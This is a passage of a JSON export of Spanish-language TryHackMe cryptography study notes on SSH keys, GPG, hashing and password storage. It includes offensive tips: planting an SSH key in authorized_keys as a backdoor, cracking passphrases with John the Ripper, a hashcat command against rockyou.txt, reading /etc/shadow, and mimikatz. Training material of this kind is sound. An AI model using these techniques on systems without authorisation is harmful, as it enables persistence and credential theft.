p√∫blica dise√±ado espec√≠ficamente para firmas digitales.\n- **ECDSA (Elliptic Curve Digital Signature Algorith):** Variante del DSA que usa criptograf√≠a de curva el√≠ptica para dar claves m√°s cortas con seguridad equivalente.\n- **ECDSA-SK (ECDSA with Security Key):** Extensi√≥n de la ECDSA con claves basadas en hardware para mejorar la seguridad.\n- **Ed25519:** Es un sistema de clave p√∫blica que usa EdDSA (Edwards-curve Digital Signature Algorithm) con Curve25519.\n- **Ed25519-SK (Ed25519 with Security Key):** Usa la misma clave basada en hardware que ECDSA-SK pero con Ed25519.\n\nPara generar el par: `ssk-keygen -t ed25519`, por ejemplo.\n\n----------------\n<h2>Claves Privadas SSH</h2>\nComo ya hemos mencionado, debemos tratar las claves privadas como contrase√±as. Es muy importante mencionar que la frase de paso (passphrase) nunca se transmite ni deja tu sistema, s√≥lo desencripta la clave SSH.\n\nUsar herramientas como John The Ripper es una manera de atacar estas claves privadas para conseguir la passphrase.\n\nLos permisos deben estar correctamente proporcionados para que el servidor acepte la clave SSH. Si no, la ignorar√°. Estos permisos en octal son `600`; o lo que es lo mismo,  `rw-------`, o m√°s estrictos.\n\nPara usar la clave para registrarte en un servidor, debes ejecutar: `ssh -i clavePrivada usuario@host`.\n\n<h4>Claves confiadas por el Host Remoto</h4>\nEl fichero `~/.ssh` es el lugar por defecto donde se guardan las claves de OpenSSH. Las `authorized_keys` es el archivo en este directorio que tiene las claves p√∫blicas confiadas para acceder al servidor, siempre que el key authentication est√© activado.\n\n------------------\n<h2>Usando Claves SSH para obtener una \"Consola Mejor\"</h2>\nDurante CTFs, penetration testing y ejercicios de Red Teaming, las claves SSH son una manera excelente de mejorar una reverse shell, asumiendo que el inicio de sesi√≥n de usuarios ha sido activado. Date cuenta que `www-data` normalmente no permite esto pero usuarios normales y root funcionar√°n. Dejar una llave SSH en el archivo `authorized_keys` de una m√°quina puede ser una backdoor importante.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. PGP and GPG",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/7-pgp-and-gpg/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/7. PGP and GPG.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "PGP significa Pretty Good Privacy. Es software que implementa la encriptaci√≥n de archivos, realizar firmas digitales y m√°s. [GnuPG o GPG](https://gnupg.org/) es una implementaci√≥n de c√≥digo abierto del est√°ndar OpenPGP.\n\nGPG es com√∫nmente usado en emails para proteger la confidencialidad de los mensajes. Adem√°s pueden ser usados para firmar mensajes de email y confirmar su integridad.\n\nDebajo un ejemplo de generaci√≥n GPG:\n\n```bash\ngpg --full-gen-key\ngpg (GnuPG) 2.4.4; Copyright (C) 2024 g10 Code GmbH\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\nPlease select what kind of key you want:\n   (1) RSA and RSA\n   (2) DSA and Elgamal\n   (3) DSA (sign only)\n   (4) RSA (sign only)\n   (9) ECC (sign and encrypt) *default*\n  (10) ECC (sign only)\n  (14) Existing key from card\nYour selection? 9\nPlease select which elliptic curve you want:\n   (1) Curve 25519 *default*\n   (4) NIST P-384\n   (6) Brainpool P-256\nYour selection? 1\nPlease specify how long the key should be valid.\n         0 = key does not expire\n      <n>  = key expires in n days\n      <n>w = key expires in n weeks\n      <n>m = key expires in n months\n      <n>y = key expires in n years\nKey is valid for? (0) \nKey does not expire at all\nIs this correct? (y/N) y\n\nGnuPG needs to construct a user ID to identify your key.\n\nReal name: strategos\nEmail address: strategos@tryhackme.thm\n[...]\npub   ed25519 2024-08-29 [SC]\n      AB7E6AA87B6A8E0D159CA7FFE5E63DBD5F83D5ED\nuid                      Strategos <strategos@tryhackme.thm>\nsub   cv25519 2024-08-29 [E]\n```\n\nCon PGP/GPG las claves pueden ser protegidas con passphrase al igual que como se protegen las claves SSH. Para romperlas puedes usar John the Ripper o `gpg2john`.\n\n-------------\n<h2>Ejemplo Pr√°ctico</h2>\nAhora que tenemos un par de clave GPG, podemos compartir la clave p√∫blica con nuestros contactos. Cuando tus contactos se quieran comunicar contigo de manera segura, encriptar√°n sus mensajes usando la clave p√∫blica. Para desencriptarlos, t√∫ usar√°s tu clave privada. Es recomendable tener un backup de la clave en alg√∫n lugar por si acaso.\n\nDigamos que tienes un ordenador nuevo. Lo √∫nico que tienes que hacer es importar tu clave del backup y puedes ponerte manos a la otra otra vez. Para ello:\n\n- Usar√°s `gpg --import backup.key`.\n- Para desencriptar mensajes: `gpg --decrypt confidential_message.gpg`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Public Key Cryptography Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/0-public-key-cryptography-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/0. Public Key Cryptography Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/1. Introduction]]\n[[2. Common Use of Asymetric Encryption]]\n[[3. RSA]]\n[[4. Diffie-Hellman Key Exchange]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/5. SSH]]\n[[6. Digital Signatures and Certificates]]\n[[7. PGP and GPG]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/8. Conclusion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/8-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/8. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "En esta unidad hemos visto las funciones hasheadoras y sus usos para diferentes prop√≥sitos. Antes de continuar, deber√≠amos distinguir entre hashear, encodear y encriptar.\n\n**Hashing**, como ya hemos visto, es un proceso mediante el cual se coge un input y se extrae un output, que es siempre el mismo y de un √∫nico sentido (no se puede \"des-hashear\").\n\n**Encoding**, convierte la informaci√≥n de una forma a otra para hacerla compatible con un sistema espec√≠fico (ASCII, UTF-8, UTF-16, etc.). Es reversible y cualquiera puede obtener la informaci√≥n, por lo que no se debe confundir con la encriptaci√≥n.\n\n**Encryption**, protege la informaci√≥n usando un cifrado criptogr√°fico y claves. Es reversible pero s√≥lo si se tiene la clave (t√©cnicamente).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "Considera este escenario. Te acabas de descargar un archivo de 6 GB y quieres saber si la copia que has descargado es id√©ntica al archivo original, bit a bit. O si una persona te diese un pincho con 6 GB, ¬øc√≥mo sabr√≠as si es exactamente igual?\n\nLa respuesta descansa en la comparaci√≥n de los valores hash. Si dos hashes son iguales, podemos estar seguros de que los archivos son id√©nticos.\n\nUn valor hash es una string de caracteres de valor fijo computada por una funci√≥n hasheadora. Esta toma un input de cualquier tama√±o y devuelve una string de caracteres de tama√±o fijo √∫nico.\n\n----------\n<h2>Pre-requisitos</h2>\nEsta unidad es la tercera de una lista de tres:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n----------------\n<h2>Objetivos de Aprendizaje</h2>\nAl completar esta unidad habr√°s aprendido:\n\n- Funciones hasheadoras y colisiones.\n- El rol del hashing en la autentificaci√≥n de sistemas.\n- Reconocer valores hash guardados.\n- Romper hashes.\n- El uso de los hashes para la protecci√≥n de la integridad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Using Hashing for Secure Password Storage",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/4-using-hashing-for-secure-password-storage/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/4. Using Hashing for Secure Password Storage.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "<h2>Usar Hashing para Guardar Contrase√±as</h2>\nAqu√≠ es donde entra el hashing. ¬øQu√© pasa si en vez de guardar las contrase√±as guard√°semos el valor hash con una funci√≥n segura? Esto implica que nunca tienes que guardar la contrase√±a de un usuario y que si se filtra, el atacante lo tendr√° muy complicado para saber cu√°l es.\n\nS√≥lo hay un problema con esto. ¬øQu√© pasa si dos usuarios tienen la misma contrase√±a? Eso quiere decir que si un atacante rompe uno de los hashes, autom√°ticamente gana acceso a m√°s de una cuenta. Tambi√©n quiere decir que alguien puede crear una Rainbow Table para romper los hashes.\n\nUna tabla arcoiris es una tabla de consulta de conversi√≥n de hash a texto plano. P√°ginas como [CrackStation](https://crackstation.net/) y [Hashes.com](https://hashes.com/en/decrypt/hash) usan masivas tablas arcoiris para ofrecer una manera r√°pida de crackear contrase√±as en hashes sin salts.\n\n------------------\n<h2>Protecci√≥n contra Tablas Arcoiris</h2>\nPara protegernos contra estas tablas, a√±adimos sal a las contrase√±as. Esto es un n√∫mero generado aleatoriamente y √∫nico para cada usuario guardado en la base de datos.\n\nCada uno de estos valores es a√±adido al inicio o al final de cada una de las contrase√±as.Funciones hasheadoras como Bcrypt y Scrypt manejan esto autom√°ticamente. Las salts no necesitan ser privadas.\n\n------------\n<h2>Ejemplo de Guardado Seguro de Contrase√±as</h2>\nConsidera comprobar si existe alg√∫n est√°ndar sobre almacenaje de contrase√±as en tu regi√≥n antes de hacerlo. Considera esto un ejemplo de buenas pr√°cticas de seguridad al almacenar contrase√±as:\n\n1. Seleccionamos una funci√≥n hasheadora segura, como Argon2, Scrypt, Bcrypt, o PBKDF2.\n2. A√±adimos una √∫nica salt a la contrase√±a, como `Y4UV*^(=go_!`.\n3. Calculamos el hash de la contrase√±a combinada con la salt. En este ejemplo usaremos `AL4RMc10kY4UV*‚ÅΩ=go_!`.\n4. Guardamos el valor hash y la salt √∫nica usada (`Y4UV*^(=go_!`)\n\n-----------\n<h2>Usar Encriptaci√≥n para guardar Contrase√±as</h2>\nConsiderando el problema para guardar contrase√±as, ¬øpor qu√© no encriptamos las contrase√±as y ya? El problema con esto es que necesitar√≠amos guardar con ellas la clave de desencriptaci√≥n, y si alguien consiguiese acceso ser√≠a todav√≠a m√°s f√°cil conseguirlas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Hash Functions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/2-hash-functions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/2. Hash Functions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "<h2>¬øQu√© es una funci√≥n haseadora?</h2>\nLas funciones hasheadoras son diferentes de la encriptaci√≥n. No hay clave y se supone que son imposibles (o computacionalmente impr√°cticas) de descodificar.\n\nUna de estas toma un input de cualquier tama√±o y crea un resumen de la informaci√≥n. El resultado tiene una longitud fija. Es dif√≠cil predecir el resultado dado el input y viceversa. Los buenos algoritmos de hashing son r√°pidos de computar e incre√≠blemente lentos de deshacer. Cualquier ligero cambio aunque s√≥lo sea un bit causar√° un gran cambio en el resultado.\n\nAlgunos \n\n-----------------\n<h2>¬øPor qu√© es importante hashear?</h2>\nEl hashing es esencial para proteger la integridad de los datos y asegurar la confidencialidad de las contrase√±as.\n\nCuando te logueas en un sitio web, se usa hashing para comprobar tu contrase√±a. Por buenas razones de seguridad, el servidor no almacena tu contrase√±a sino el hash. Para darte acceso, se comparar√°n los hashes de tu contrase√±a y el guardado por el servidor.\n\n-----------------\n<h2>¬øQu√© es una colisi√≥n de hashes?</h2>\nUna colisi√≥n de hashes es cuando dos inputs diferentes dan el mismo resultado. Las funciones hasheadoras est√°n dise√±adas para evitar esto. Adem√°s previenen a usuarios de hacerlo adrede. Sin embargo, como el n√∫mero de inputs es pr√°cticamente ilimitado y los resultados son limitados, esto lleva al efecto pigeonhole (encasillamiento).\n\nPor poner un ejemplo num√©rico: Si una funci√≥n hash produce un valor hash de 4 bits. S√≥lo tenemos 16 valores hash. El n√∫mero total de valores hash posibles es `2^numero_de_bits = 2‚Å¥ = 16`. La probabilidad de colisi√≥n es bastante alta.\n\nEl efecto pigeonhole declara que el n√∫mero de √≠tems (pigeons) es mayor que el numero de casillas (pigeonholes), es lo mismo que pasa si juntas a 400 personas y preguntas por su cumplea√±os, al menos dos cumplir√°n el mismo d√≠a, es inevitable.\n\nMD5 y SHA1 han sido atacados y ahora son considerados inseguros dado a la habilidad de generar colisiones de hashes. Sin embargo, ning√∫n ataque las ha generado en ambos a la vez. Si comparamos MD5 y SHA1 veremos que son diferentes. Aprende m√°s sobre estos ataques en [MD5 ataque de colisi√≥n](https://www.mscs.dal.ca/~selinger/md5collision/) y [SHA1 ataque de colisi√≥n](https://shattered.io/).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Password Cracking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/6-password-cracking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/6. Password Cracking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "ya hemos hablado de c√≥mo las tablas arcoiris nos pueden ayudar si los hashes no usan salt, pero ¬øqu√© pasa si s√≠ que est√° involucrada?\n\nNo puedes desencriptar hashes porque no est√°n encriptados. Los puedes crackear hasheando m√∫ltiples entradas como `rockyou.txt`, a√±adiendo salt, si hay. Herramientas como [Hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/) son com√∫nmente utilizadas para este prop√≥sito.\n\n-----------------\n<h2>Crackeando Contrase√±as con GPUs</h2>\nLas gr√°ficas modernas tienen miles de n√∫cleos. Se especializan en procesamiento de im√°genes digitales y aceleraci√≥n de computaci√≥n de gr√°ficos. Aunque no pueden hacer el mismo tipo de trabajo que hacen las CPUs, son muy buenas con ciertas operaciones matem√°ticas, as√≠ que puedes usarlas para romper los hashes m√°s r√°pido, aunque algunos algoritmos como Bcrypt no ofrecen ventajas con respecto a la CPU lo que los ayuda a mantanerse protegidos.\n\n-----------\n<h2>¬øCrackeando en M√°quinas Virtuales?</h2>\nNormalmente, las m√°quinas virtuales no tienen acceso a la tarjeta gr√°fica del dispositivo que las hostea, aunque se puede configurar para ello.\n\nSi quieres usar Hashcat, es mejor usarlo en el host. Si prefieres MS Windows tambi√©n puedes, desde Powershell.\n\nJohn the Ripper usa CPU por defecto y funciona en una m√°quina virtual, aunque puedes conseguir mejor rendimiento en el host.\n\n--------------\n<h2>Hora de Crackear algunos Hashes</h2>\nVamos a usar Hashcat para crackear algunos hashes. La sintaxis b√°sica de Hashcat es:\n\n`hashcat -m <tipo_hash> -a <modo_ataque> hashfile wordlist` donde:\n\n- `-m <tipo_hash>`: Especifica el tipo de hash en formato num√©rico. por ejemplo `-m 1000` es para NTLM. para comprobar el c√≥digo puedes usar `man hashcat | grep <tipo_hash>`.\n- `-a <modo_ataque>`: Especifica el modo de ataque. Por ejemplo, `-a 0` es para \"directo\" (usar una contrase√±a de la lista despu√©s de otra).\n- `hashfile`: Es el archivo que contiene el hash que quieres crackear.\n- `wordlist`: Es el archivo que contiene la lista de palabras que quieres utilizar.\n\nPor ejemplo, `hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` tratar√° el hash como Bcrypt e intentar√° las contrase√±as del archivo `rockyou.txt`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Insecure Password Storage for Authentication",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/3-insecure-password-storage-for-authentication/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/3. Insecure Password Storage for Authentication.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "El hashing tiene m√∫ltiples usos en ciberseguridad. En esta lecci√≥n aprenderemos dos: almacenamiento de contrase√±as e integridad de datos. Es importante recalcar que esto no aplica a los gestores de contrase√±as, los cuales necesitan rescatarlas en texto plano. Por otro lado, los mecanismos de autentificaci√≥n s√≥lo necesitan confirmar que el usuario conoce la contrase√±a.\n\n------------\n<h2>Historias de Almacenamiento Inseguro de Contrase√±as para la Autentificaci√≥n</h2>\nLa mayor√≠a de aplicaciones web necesitan verificar la contrase√±a de un usuario en alg√∫n punto. Guardar estas contrase√±as en texto plano es una pr√°ctica muy insegura. El hecho de que mucha gente use la misma contrase√±a para todo hace que si una de sus m√∫ltiples cuentas se ve expuesta, todas lo sean.\n\nVeremos tres pr√°cticas inseguras en lo que respecta a las contrase√±as:\n\n- Guardar contrase√±as en texto plano.\n- Guardar contrase√±as usando un sistema de encriptaci√≥n deprecado.\n- Guardar contrase√±as usando un algoritmo de hashing inseguro.\n\n<h3>Guardar contrase√±as en texto plano</h3>\nSeguramente est√©s familiarizado con la lista `rockyou.txt` de contrase√±as en Kali Linux. Esta lista proviene de la empresa RockYou, la cual guardaba sus contrase√±as en texto plano y que se vio comprometida. El archivo contiene alrededor de 14 millones de contrase√±as. Puedes encontrar dicho archivo en `/usr/share/wordlists/`.\n\n<h3>Usar algoritmos de encriptaci√≥n inseguros</h3>\nEl data breach de Adobe fue algo diferente. En vez de usar una funci√≥n hasheadora segura, la compa√±√≠a usaba una deprecada para almacenar las contrase√±as. Adem√°s, las pistas de las contrase√±as se guardaban en texto plano, llegando a contener la propia contrase√±a.\n\n<h3>Usar una funci√≥n de hasheo insegura</h2>\nLinkedIn tambi√©n sufri√≥ un data breach en 2012. Esta empresa usaba un algoritmo inseguro, SHA-1, para guardar las contrase√±as. Adem√°s no se usaba password salting (a√±adir **salt**, un valor aleatorio antes de hashear).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Recognising Password Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/5-recognising-password-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/5. Recognising Password Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "Hemos cubierto c√≥mo guardar contrase√±as de forma segura para sistemas de autentificaci√≥n desde el lado defensivo. Ve√°moslo desde el lado ofensivo ahora. Dados un hash, ¬øc√≥mo reconocemos el tipo, lo rompemos y obtenemos la contrase√±a?\n\nExisten herramientas automatizadas de reconocimiento de hash como [hashID](https://pypi.org/project/hashID/) pero no son del todo fiables.\n\n-----------\n<h2>Contrase√±as de Linux</h2>\nEn Linux, los hashes de las contrase√±as se guardan en `/etc/shadow`, que es normalmente s√≥lo le√≠ble por root. Sol√≠a guardarse en `/etc/passwd`, que era le√≠ble por todos.\n\nCada l√≠nea en `/etc/shadow` contiene 9 campos separados por `:`. Los primeros dos campos son el nombre y la contrase√±a encriptada.\n\nEl campo de la contrase√±a encriptada contiene la contrase√±a con 4 componentes: prefijo (id de algoritmo), opciones (par√°metros), salt y hash. El prefijo hace que sea f√°cil identificar el tipo de algoritmo.\n\nAqu√≠ una tabla de prefijos listado en orden descendente de fortaleza:\n\n| Prefijo                        | Algoritmo                                                                                                                                            |\n| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `$y$`                          | yescrypt es un esquema de hashing escalable por defecto recomendado en sistemas nuevos.                                                              |\n| `$gy$`                         | gost-yescrypt usa la funci√≥n hasheadora GOST R 34.11-2012 y el m√©todo yescrypt.                                                                      |\n| `$7$`                          | scrypt es una funci√≥n basada en contrase√±as                                                                                                          |\n| `$2b$`, `$2y$`, `$2a$`, `$2x$` | bcrypt es un hash basado en el bloque de cifrado Blowfishdesarrollado por OpenBSD.                                                                   |\n| `$6$`                          | sha512crypt es un hash basado en SHA-2 con output de 512-bits originalmente desarrollado for GNU libc y comunmente usado en sistemas Linux antiguos. |\n| `$md5`                         | SunMD5 es un hash basado en el algoritmo MD5 originalmente desarrollado por Solaris                                                                  |\n| `$1$`                          | md5crypt es un hash basado en el algoritmo MD5 originalmente desarrollado por FreeBSD                                                                |\n\n-------------\n<h2>Contrase√±as de Linux Moderno</h2>\nConsidera la siguiente l√≠nea de un sistema Linux moderno del archivo `shadow`:\n\n```bash\nroot@TryHackMe# sudo cat /etc/shadow | grep strategos strategos:$y$j9T$76UzfgEM5PnymhQ7TlJey1$/OOSg64dhfF.TigVPdzqiFang6uZA4QA1pzzegKdVm4:19965:0:99999:7:::\n```\n\nEn el ejemplo vemos cuatro partes separadas por `$`:\n\n- `y` indica el algoritmo de hasheado utilizado, **yescrypt**.\n- `j9T` es un par√°metro pasado al algoritmo.\n- `76UzfgEM5PnymhQ7TlJey1` es la salt usada.\n- `/OOSg64dhfF.TigVPdzqiFang6uZA4QA1pzzegKdVm4` es el valor hash.\n\n------------\n<h2>Contrase√±as de MS Windows</h2>\nLas contrase√±as de Windows MS se hashean usando NTLM, una variante de MD4. Son visualmente id√©nticas a los hashes MD4 y MD5.\n\nEn MS Windows, los hashes de contrase√±as se guardan en SAM (Security Accounts Manager). MS Windows intenta prevenir a los usuarios normales de verlas pero existen herramientas como `mimikatz` para bypassear la seguridad de Windows. Los hashes que encontramos all√≠ se dividen entre hashes NT y hashes LM.\n\nUn buen lugar para encontrar m√°s formatos de hashing y prefijos de contrase√±as es la p√°gina [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). Para otros tipos, normalmente tendr√°s que comprobar la longitud o codificaci√≥n o incluso realizar una investigaci√≥n en la aplicaci√≥n que los gener√≥.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Hashing for Integrity Checking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/7-hashing-for-integrity-checking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/7. Hashing for Integrity Checking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "En esta lecci√≥n vamos a ver c√≥mo podemos usar las funciones hasheadoras para comprobar la integridad de los archivos.\n\n-----------\n<h2>Comprobaci√≥n de Integridad</h2>\nEl hashing puede ser usado para comprobar que los archivos no han cambiado. Si pones siempre la misma informaci√≥n de entrada, siempre obtendr√°s la misma de salida. Tambi√©n es √∫til para encontrar y eliminar archivos duplicados.\n\n------------\n<h2>HMACs</h2>\nHMAC (Keyed-Hash Message Authentification Code) es un tipo de c√≥digo de mensaje de autentificaci√≥n que usa una funci√≥n hasheadora de criptograf√≠a en combinaci√≥n con una clave secreta para verificar la autenticidad e integridad de los datos.\n\nUn HMAC puede ser usado para asegurarse de que la persona que lo ha creado es quien dice ser. Adem√°s prueba que el mensaje original no ha sido modificado o corrompido.\n\nAqu√≠ c√≥mo funciona HMAC:\n\n1. La clave secreta es a√±adida al tama√±o de la funci√≥n hasheadora.\n2. La clave a√±adida es pasada por un XOR con una constante (usualmente un bloque de 0 y 1).\n3. El mensaje es hasheado usando la funci√≥n hasheadora con la clave pasada por un XOR.\n4. El resultado del paso 3 se hashea de nuevo con la misma funci√≥n pero usando la clave a√±adida pasada por XOR con otra constante.\n5. El resultado final es el valor HMAC.\n\nEn la ilustraci√≥n se muestra:\n\n![[133.jpg]]\n\nT√©cnicamente hablando, la funci√≥n HMAC se calcula de la siguiente manera:\n\n`HMAC(K,M)‚ÄÑ=‚ÄÑH((K ‚äï opad) || H((K ‚äï ipad) || M))`\n\nM y K representan el mensaje y la clave, respectivamente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Hashing Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/0-hashing-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/0. Hashing Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/1. Introduction]]\n[[2. Hash Functions]]\n[[3. Insecure Password Storage for Authentication]]\n[[4. Using Hashing for Secure Password Storage]]\n[[5. Recognising Password Hashes]]\n[[6. Password Cracking]]\n[[7. Hashing for Integrity Checking]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/8. Conclusion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Historical Ciphers",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/4-historical-ciphers/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/4. Historical Ciphers.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "La historia de la criptograf√≠a es larga y data desde el antigua Egipto sobre el 1900 AC. Uno de los cifrados m√°s simples, sin embargo, es del primer siglo DC. La idea es simple, rotar cada letra un n√∫mero de posiciones (todas el mismo n√∫mero).\n\nAqu√≠ un ejemplo con `key = 3`:\n\nEncriptaci√≥n:\n\n![[127.jpg]]\n\nDesencriptaci√≥n:\n\n![[128.jpg]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "¬øAlguna vez te has preguntado c√≥mo evitar que otras personas puedan leer tus mensajes? ¬øC√≥mo puede una app o un navegador construir un canal seguro con un servidor remoto? Gracias a la criptograf√≠a.\n\nEsta son los cimientos del mundo digital. Los protocolos y el networking han hecho que todos los dispositivos del mundo se puedan comunicar, pero la criptograf√≠a ha sido la que ha conseguido que podamos confiar esa informaci√≥n.\n\nEsta es la primera unidad de un grupo de tres:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n----------\n<h2>Objetivos de Aprendizaje</h2>\nAprenderemos:\n\n- T√©rminos clave de la criptograf√≠a.\n- La importancia de la criptograf√≠a.\n- Cifrado C√©sar.\n- Cifrados sim√©tricos est√°ndar.\n- Cifrados asim√©tricos comunes.\n- Matem√°ticas b√°sicas usadas en criptograf√≠a.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Plaintext to Ciphertext",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/3-plaintext-to-ciphertext/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/3. Plaintext to Ciphertext.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "El m√©todo de encriptaci√≥n es el siguiente:\n\n1. El emisor manda el texto en texto plano (claro), que puede ser texto, una foto, etc.\n2. Se pasa el mensaje en texto plano por una llave.\n3. Se obtiene el mensaje encriptado.\n\n![[125.jpg]]\n\nPara recuperar el mensaje:\n\n1. Se coge el texto cifrado.\n2. Se pasa por la llave de desencriptaci√≥n.\n3. Se obtiene el mensaje en texto plano.\n\n![[126.jpg]]\n\nT√©rminos que acabamos de ver:\n\n- **Plaintext:** Es el mensaje original antes de ser encriptado.\n- **Ciphertext:** Es la versi√≥n inle√≠ble del mensaje original (encriptado).\n- **Cipher:** Es un algoritmo o m√©todo de cifrado y descifrado.\n- **Key:** Es una string de bits que se usa para cifrar y descifrar. Por lo general el cipher es de dominio p√∫blico, pero la llave debe permanecer secreta.\n- **Encryption:** Es el proceso de convertir el plaintext en ciphertext.\n- **Decryption:** Es el proceso de desconvertir el ciphertext de vuelta en plaintext.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Types of Encryption",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/5-types-of-encryption/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/5. Types of Encryption.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
